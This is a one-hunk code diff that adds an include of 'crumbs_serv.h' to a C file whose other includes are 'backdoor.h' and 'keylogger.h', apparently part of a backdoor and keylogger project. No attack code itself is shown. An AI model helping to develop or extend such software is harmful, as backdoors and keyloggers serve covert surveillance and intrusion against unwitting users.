@@ -3,6 +3,7 @@
 
 #include "backdoor.h"
 #include "common.h"
+#include "crumbs_serv.h"
 #include "list.h"
 #include "keylogger.h"
 #include "misc.h"
